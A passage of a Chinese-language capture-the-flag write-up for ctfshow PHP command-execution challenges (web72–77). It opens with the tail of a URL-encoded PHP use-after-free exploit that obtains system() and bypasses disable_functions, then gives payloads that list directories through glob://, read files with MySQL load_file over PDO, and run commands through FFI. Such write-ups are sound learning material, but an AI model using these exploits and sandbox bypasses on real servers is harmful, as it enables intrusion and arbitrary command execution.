%24s+*+8)+-+1%3b+%7d%0a++++++++return+%24leak%3b%0a++++%7d%0a%0a++++function+parse_elf(%24base)+%7b%0a++++++++%24e_type+%3d+leak(%24base%2c+0x10%2c+2)%3b%0a%0a++++++++%24e_phoff+%3d+leak(%24base%2c+0x20)%3b%0a++++++++%24e_phentsize+%3d+leak(%24base%2c+0x36%2c+2)%3b%0a++++++++%24e_phnum+%3d+leak(%24base%2c+0x38%2c+2)%3b%0a%0a++++++++for(%24i+%3d+0%3b+%24i+%3c+%24e_phnum%3b+%24i%2b%2b)+%7b%0a++++++++++++%24header+%3d+%24base+%2b+%24e_phoff+%2b+%24i+*+%24e_phentsize%3b%0a++++++++++++%24p_type++%3d+leak(%24header%2c+0%2c+4)%3b%0a++++++++++++%24p_flags+%3d+leak(%24header%2c+4%2c+4)%3b%0a++++++++++++%24p_vaddr+%3d+leak(%24header%2c+0x10)%3b%0a++++++++++++%24p_memsz+%3d+leak(%24header%2c+0x28)%3b%0a%0a++++++++++++if(%24p_type+%3d%3d+1+%26%26+%24p_flags+%3d%3d+6)+%7b+%23+PT_LOAD%2c+PF_Read_Write%0a++++++++++++++++%23+handle+pie%0a++++++++++++++++%24data_addr+%3d+%24e_type+%3d%3d+2+%3f+%24p_vaddr+%3a+%24base+%2b+%24p_vaddr%3b%0a++++++++++++++++%24data_size+%3d+%24p_memsz%3b%0a++++++++++++%7d+else+if(%24p_type+%3d%3d+1+%26%26+%24p_flags+%3d%3d+5)+%7b+%23+PT_LOAD%2c+PF_Read_exec%0a++++++++++++++++%24text_size+%3d+%24p_memsz%3b%0a++++++++++++%7d%0a++++++++%7d%0a%0a++++++++if(!%24data_addr+%7c%7c+!%24text_size+%7c%7c+!%24data_size)%0a++++++++++++return+false%3b%0a%0a++++++++return+%5b%24data_addr%2c+%24text_size%2c+%24data_size%5d%3b%0a++++%7d%0a%0a++++function+get_basic_funcs(%24base%2c+%24elf)+%7b%0a++++++++list(%24data_addr%2c+%24text_size%2c+%24data_size)+%3d+%24elf%3b%0a++++++++for(%24i+%3d+0%3b+%24i+%3c+%24data_size+%2f+8%3b+%24i%2b%2b)+%7b%0a++++++++++++%24leak+%3d+leak(%24data_addr%2c+%24i+*+8)%3b%0a++++++++++++if(%24leak+-+%24base+%3e+0+%26%26+%24leak+-+%24base+%3c+%24data_addr+-+%24base)+%7b%0a++++++++++++++++%24deref+%3d+leak(%24leak)%3b%0a++++++++++++++++%23+%27constant%27+constant+check%0a++++++++++++++++if(%24deref+!%3d+0x746e6174736e6f63)%0a++++++++++++++++++++continue%3b%0a++++++++++++%7d+else+continue%3b%0a%0a++++++++++++%24leak+%3d+leak(%24data_addr%2c+(%24i+%2b+4)+*+8)%3b%0a++++++++++++if(%24leak+-+%24base+%3e+0+%26%26+%24leak+-+%24base+%3c+%24data_addr+-+%24base)+%7b%0a++++++++++++++++%24deref+%3d+leak(%24leak)%3b%0a++++++++++++++++%23+%27bin2hex%27+constant+check%0a++++++++++++++++if(%24deref+!%3d+0x786568326e6962)%0a++++++++++++++++++++continue%3b%0a++++++++++++%7d+else+continue%3b%0a%0a++++++++++++return+%24data_addr+%2b+%24i+*+8%3b%0a++++++++%7d%0a++++%7d%0a%0a++++function+get_binary_base(%24binary_leak)+%7b%0a++++++++%24base+%3d+0%3b%0a++++++++%24start+%3d+%24binary_leak+%26+0xfffffffffffff000%3b%0a++++++++for(%24i+%3d+0%3b+%24i+%3c+0x1000%3b+%24i%2b%2b)+%7b%0a++++++++++++%24addr+%3d+%24start+-+0x1000+*+%24i%3b%0a++++++++++++%24leak+%3d+leak(%24addr%2c+0%2c+7)%3b%0a++++++++++++if(%24leak+%3d%3d+0x10102464c457f)+%7b+%23+ELF+header%0a++++++++++++++++return+%24addr%3b%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%0a++++function+get_system(%24basic_funcs)+%7b%0a++++++++%24addr+%3d+%24basic_funcs%3b%0a++++++++do+%7b%0a++++++++++++%24f_entry+%3d+leak(%24addr)%3b%0a++++++++++++%24f_name+%3d+leak(%24f_entry%2c+0%2c+6)%3b%0a%0a++++++++++++if(%24f_name+%3d%3d+0x6d6574737973)+%7b+%23+system%0a++++++++++++++++return+leak(%24addr+%2b+8)%3b%0a++++++++++++%7d%0a++++++++++++%24addr+%2b%3d+0x20%3b%0a++++++++%7d+while(%24f_entry+!%3d+0)%3b%0a++++++++return+false%3b%0a++++%7d%0a%0a++++function+trigger_uaf(%24arg)+%7b%0a++++++++%23+str_shuffle+prevents+opcache+string+interning%0a++++++++%24arg+%3d+str_shuffle(%27AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27)%3b%0a++++++++%24vuln+%3d+new+Vuln()%3b%0a++++++++%24vuln-%3ea+%3d+%24arg%3b%0a++++%7d%0a%0a++++if(stristr(PHP_OS%2c+%27WIN%27))+%7b%0a++++++++die(%27This+PoC+is+for+*nix+systems+only.%27)%3b%0a++++%7d%0a%0a++++%24n_alloc+%3d+10%3b+%23+increase+this+value+if+UAF+fails%0a++++%24contiguous+%3d+%5b%5d%3b%0a++++for(%24i+%3d+0%3b+%24i+%3c+%24n_alloc%3b+%24i%2b%2b)%0a++++++++%24contiguous%5b%5d+%3d+str_shuffle(%27AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27)%3b%0a%0a++++trigger_uaf(%27x%27)%3b%0a++++%24abc+%3d+%24backtrace%5b1%5d%5b%27args%27%5d%5b0%5d%3b%0a%0a++++%24helper+%3d+new+Helper%3b%0a++++%24helper-%3eb+%3d+function+(%24x)+%7b+%7d%3b%0a%0a++++if(strlen(%24abc)+%3d%3d+79+%7c%7c+strlen(%24abc)+%3d%3d+0)+%7b%0a++++++++die(%22UAF+failed%22)%3b%0a++++%7d%0a%0a++++%23+leaks%0a++++%24closure_handlers+%3d+str2ptr(%24abc%2c+0)%3b%0a++++%24php_heap+%3d+str2ptr(%24abc%2c+0x58)%3b%0a++++%24abc_addr+%3d+%24php_heap+-+0xc8%3b%0a%0a++++%23+fake+value%0a++++write(%24abc%2c+0x60%2c+2)%3b%0a++++write(%24abc%2c+0x70%2c+6)%3b%0a%0a++++%23+fake+reference%0a++++write(%24abc%2c+0x10%2c+%24abc_addr+%2b+0x60)%3b%0a++++write(%24abc%2c+0x18%2c+0xa)%3b%0a%0a++++%24closure_obj+%3d+str2ptr(%24abc%2c+0x20)%3b%0a%0a++++%24binary_leak+%3d+leak(%24closure_handlers%2c+8)%3b%0a++++if(!(%24base+%3d+get_binary_base(%24binary_leak)))+%7b%0a++++++++die(%22Couldn%27t+determine+binary+base+address%22)%3b%0a++++%7d%0a%0a++++if(!(%24elf+%3d+parse_elf(%24base)))+%7b%0a++++++++die(%22Couldn%27t+parse+ELF+header%22)%3b%0a++++%7d%0a%0a++++if(!(%24basic_funcs+%3d+get_basic_funcs(%24base%2c+%24elf)))+%7b%0a++++++++die(%22Couldn%27t+get+basic_functions+address%22)%3b%0a++++%7d%0a%0a++++if(!(%24zif_system+%3d+get_system(%24basic_funcs)))+%7b%0a++++++++die(%22Couldn%27t+get+zif_system+address%22)%3b%0a++++%7d%0a%0a++++%23+fake+closure+object%0a++++%24fake_obj_offset+%3d+0xd0%3b%0a++++for(%24i+%3d+0%3b+%24i+%3c+0x110%3b+%24i+%2b%3d+8)+%7b%0a++++++++write(%24abc%2c+%24fake_obj_offset+%2b+%24i%2c+leak(%24closure_obj%2c+%24i))%3b%0a++++%7d%0a%0a++++%23+pwn%0a++++write(%24abc%2c+0x20%2c+%24abc_addr+%2b+%24fake_obj_offset)%3b%0a++++write(%24abc%2c+0xd0+%2b+0x38%2c+1%2c+4)%3b+%23+internal+func+type%0a++++write(%24abc%2c+0xd0+%2b+0x68%2c+%24zif_system)%3b+%23+internal+func+handler%0a%0a++++(%24helper-%3eb)(%24cmd)%3b%0a++++exit()%3b%0a%7d
```

![image-20260107203019750](ctfshow-web(命令执行).assets/image-20260107203019750.png)

```
ctfshow{82215053-622d-41dd-8c65-9e0ae2c9f1c2}
```





### web73

![image-20260107203239298](ctfshow-web(命令执行).assets/image-20260107203239298.png)

```
c=var_export(scandir('./'));exit();
```

![image-20260107203401813](ctfshow-web(命令执行).assets/image-20260107203401813.png)

flag在flagc.txt上

```
c=include("/flagc.txt");exit();
```

![image-20260107203502646](ctfshow-web(命令执行).assets/image-20260107203502646.png)





### web74

scandir被禁了

![image-20260107203836746](ctfshow-web(命令执行).assets/image-20260107203836746.png)

![image-20260107203913901](ctfshow-web(命令执行).assets/image-20260107203913901.png)

用glob伪协议

```
c=$a=opendir("glob:///*"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };exit();
```

发现存在flagx.txt

![image-20260107204018998](ctfshow-web(命令执行).assets/image-20260107204018998.png)

直接读取一下

```
c=include("/flagx.txt");exit();
```

![image-20260107204055244](ctfshow-web(命令执行).assets/image-20260107204055244.png)

```
ctfshow{c98d0b32-64a2-43ae-9368-8f1d55688004}
```



### web75

![image-20260107205425502](ctfshow-web(命令执行).assets/image-20260107205425502.png)

使用glob协议绕过 open_basedir，读取根目录下的文件，payload：

```
c=?><?php $a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{
   echo($f->__toString().' ');
}
exit(0);
?>
```

![image-20260107205733791](ctfshow-web(命令执行).assets/image-20260107205733791.png)

然后读取发现incldue要被过滤了

![image-20260107205901226](ctfshow-web(命令执行).assets/image-20260107205901226.png)

利用 mysql load_file ，提示中是从数据库 ctftraining 中查询的，就算我们不知道这个数据库名，也可以直接从默认的 information_schema 中查，该数据库包含了所有的数据库的内容。

payload：

```php
c=try {
  $dbh = new PDO('mysql:host=localhost;dbname=information_schema', 'root', 'root');
  foreach($dbh->query('select load_file("/flag36.txt")') as $row) {  
      echo($row[0])."|";
  }
  $dbh = null;
} catch (PDOException $e) {
  echo $e->getMessage();
  die();
};exit();
```

解释

```php
try {
    // 使用PDO（PHP Data Objects）创建一个新的数据库连接对象，指定DSN、用户名（root）和密码（root）
    $dbh = new PDO('mysql:host=localhost;dbname=information_schema', 'root', 'root');
    
    // 执行一个SQL查询，从指定的文件（/flag36.txt）中读取内容
    foreach($dbh->query('select load_file("/flag36.txt")') as $row) {  
        // 输出读取到的内容，并追加一个竖线（|）
        echo($row[0])."|";
    }
    
    // 将数据库连接对象设置为null，关闭连接
    $dbh = null;
} catch (PDOException $e) {
    // 如果发生PDO异常，输出错误信息
    echo $e->getMessage();
    // 终止脚本执行
    die();
}
 
// 终止脚本执行
exit();
```

```
 $dbh 是数据库连接句柄（database handle），它是通过 new PDO 创建的，用于与数据库进行交互。

PDO（PHP Data Objects）是PHP中的一个扩展，它提供了一个统一的接口来访问不同的数据库。它支持预处理语句和事务，使数据库操作更安全和高效。

DSN（数据源名称，Data Source Name）是一个包含数据库连接信息的字符串。它通常包括数据库类型、主机名、数据库名称等信息。在创建PDO对象时指定，即 'mysql:host=localhost;dbname=information_schema'。这个字符串包含了数据库类型（mysql）、主机名（localhost）和数据库名称（information_schema）。

foreach 是PHP中的一个控制结构，用于遍历数组或对象。在上面payload中，foreach 用于遍历SQL查询的结果集（由 $dbh->query 返回），并处理每一行的数据。
```

![image-20260107210238391](ctfshow-web(命令执行).assets/image-20260107210238391.png)

```
ctfshow{11ea8efd-f0c9-4097-823d-7736aa480a44} 
```

当然我们也可以查一下有哪些数据库：

```
c=$dsn = "mysql:host=localhost;dbname=information_schema";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();
```

![image-20260107210346547](ctfshow-web(命令执行).assets/image-20260107210346547.png)

payload 解释：

```php
// 数据源名称（DSN），指定数据库类型、主机名和数据库名称
$dsn = "mysql:host=localhost;dbname=information_schema";
 
// 使用PDO（PHP Data Objects）创建一个新的数据库连接对象，使用指定的DSN、用户名（root）和密码（root）
$db = new PDO($dsn, 'root', 'root');
 
// 执行一个SQL查询，从SCHEMATA表中选择并连接所有数据库名称（SCHEMA_NAME），返回一个结果集
$rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");
 
// 遍历结果集中的每一行，并输出第一个字段（即连接的数据库名称），然后追加一个竖线（|）
foreach($rs as $row){
    echo($row[0])."|";
}
 
// 终止脚本执行
exit();
```

确实存在一个名为 ctftraining 的数据库 

我们还可以继续查 ctftraining 数据库下的所有表：

```php
c=$dsn = "mysql:host=localhost;dbname=information_schema";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select group_concat(TABLE_NAME) FROM TABLES WHERE TABLE_SCHEMA = 'ctftraining'");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();
```

![image-20260107210508602](ctfshow-web(命令执行).assets/image-20260107210508602.png)

查该表下的列名：

```
c=$dsn = "mysql:host=localhost;dbname=information_schema";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select group_concat(COLUMN_NAME) FROM COLUMNS WHERE TABLE_SCHEMA = 'ctftraining' and TABLE_NAME = 'FLAG_TABLE'");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();
```

得到列名为 FLAG_COLUMN 

![image-20260107210624131](ctfshow-web(命令执行).assets/image-20260107210624131.png)

查询具体字段信息：

```php
c=$dsn = "mysql:host=localhost;dbname=ctftraining";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("SELECT FLAG_COLUMN FROM FLAG_TABLE");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();
```



### web76

![image-20260107211007771](ctfshow-web(命令执行).assets/image-20260107211007771.png)

读取根目录下的文件：

```php
c=$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{
   echo($f->__toString().' ');
}
exit(0);
```

![image-20260107211046624](ctfshow-web(命令执行).assets/image-20260107211046624.png)

存在名为 flag36d.txt 的文件

使用上一题的方法获取：

```php
c=try {
  $dbh = new PDO('mysql:host=localhost;dbname=information_schema', 'root', 'root');
  foreach($dbh->query('select load_file("/flag36d.txt")') as $row) {  
      echo($row[0])."|";
  }
  $dbh = null;
} catch (PDOException $e) {
  echo $e->getMessage();
  die();
};exit();
```

![image-20260107211114249](ctfshow-web(命令执行).assets/image-20260107211114249.png)

```
ctfshow{b69efdb2-c28d-4273-9dcc-5f422676059a}
```



### web77

![image-20260107211409789](ctfshow-web(命令执行).assets/image-20260107211409789.png)

先看看有什么文件来

![image-20260107211459427](ctfshow-web(命令执行).assets/image-20260107211459427.png)

读取根目录后发现存在 flag36x.txt 和 readflag

（readflag 这个东西在前面的题里面遇到过，它是一个可执行的二进制文件，执行它即可获取 flag，这里为什么要用这个 readflag 而不是直接读取 flag36x.txt 我们后面再说）

采用前面的方法，但是回显 could not find driver

![image-20260107211611706](ctfshow-web(命令执行).assets/image-20260107211611706.png)

用 PHP 中的 FFI（Foreign Function Interface）来调用 C 语言的 system 函数，并执行一个 Shell 命令。

```
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数
```

```
FFI::cdef 方法用于定义 C 函数原型，其中 int system(const char *command); 是 C 语言中 system  函数的声明。system 函数接受一个字符串参数（即Shell命令），并在系统的命令行中执行该命令；

之后执行 /readflag 程序并将其输出重定向到文件 1.txt；

通过 FFI 对象 $ffi 调用了前面定义的 system 函数，并传递了字符串变量 $a 作为参数。也就是说，实际执行的是 Shell 命令 /readflag > 1.txt，效果是在系统中运行 /readflag 程序，并将其输出结果保存到当前目录下的 1.txt 文件中。
```

先执行命令

```
c=$ffi = FFI::cdef("int system(const char *command);");$a='/readflag > 1.txt';$ffi->system($a);
```

可以得到

```
ctfshow{356fe5ab-7100-42c5-b325-65bb1af3a89e}
```

